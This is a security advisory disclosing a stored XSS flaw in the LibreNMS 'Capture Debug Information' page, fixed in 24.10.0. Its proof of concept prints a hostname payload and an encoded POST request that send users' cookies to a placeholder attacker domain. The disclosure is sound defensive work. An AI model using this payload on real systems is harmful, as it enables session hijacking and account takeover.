# Stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/device/capture.inc.php

High

[murrant](/murrant)
published
GHSA-rmr4-x6c9-jc68
Nov 15, 2024

## Package

librenms/includes/html/pages/device/capture.inc.php
(LibreNMS)

## Affected versions

<= 24.9.1

## Patched versions

24.10.0

## Description

### Summary

A Stored Cross-Site Scripting (XSS) vulnerability in the "Capture Debug Information" page allows authenticated users to inject arbitrary JavaScript through the "hostname" parameter when creating a new device. This vulnerability results in the execution of malicious code when the "Capture Debug Information" page is visited, redirecting the user and sending non-httponly cookies to an attacker-controlled domain.

### Details

When creating a new device, an attacker can inject the following XSS payload into the "hostname" parameter:

```
test'" autofocus onfocus="document.location='https://<attacker_domain>/logger.php?c='+document.cookie"

```

(Note: You may need to URL-encode the '+' sign in the payload.)

The payload triggers automatically when visiting the "Capture Debug Information" page for the device, redirecting the user's browser to the attacker-controlled domain along with any non-httponly cookies.

The vulnerability is due to insufficient sanitization of the "url" variable before it is output in the HTML. This is evident in the following lines of code:

[librenms/includes/html/pages/device/capture.inc.php](https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/capture.inc.php#L55)

Line 55
in
[7f2ae97](/librenms/librenms/commit/7f2ae971c4a565b0d7345fa78b4211409f96800a)

|  | <a class="btn btn-warning" href="<?php echo str\_replace('text', 'download', $url) ?>"><i class="fa fa-download fa-lg"></i> Download</a> |
| --- | --- |

### PoC

1. Create a new device with the following payload in the "hostname" parameter:

```
test'" autofocus onfocus="document.location='https://<attacker_domain>/logger.php?c='+document.cookie"

```

2. Save the device.
3. Navigate to the "Capture Debug Information" page for the device.
4. Observe that the injected script triggers and redirects the user to the attacker's domain, sending cookies.

Example Request:

```
POST /addhost HTTP/1.1
Host: <your_host>
Content-Type: application/x-www-form-urlencoded
Cookie: <your_cookie>

_token=<your_token>&hostname=test%27%22+autofocus+onfocus%3D%22document.location%3D%27https%3A%2F%2F<attacker_domain>%2Flogger.php%3Fc%3D%27%2bdocument.cookie%22&snmp=on&sysName=&hardware=&os=&os_id=&snmpver=v2c&port=&transport=udp&port_assoc_mode=ifIndex&community=&authlevel=noAuthNoPriv&authname=&authpass=&authalgo=SHA&cryptopass=&cryptoalgo=AES&force_add=on&Submit=
```
### Impact

This vulnerability allows authenticated users to execute arbitrary JavaScript in the context of other users' sessions when they visit the "Capture Debug Information" page of the device. The attacker can redirect the user to a malicious domain and capture non-httponly cookies, potentially compromising the user's account and allowing unauthorized actions.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
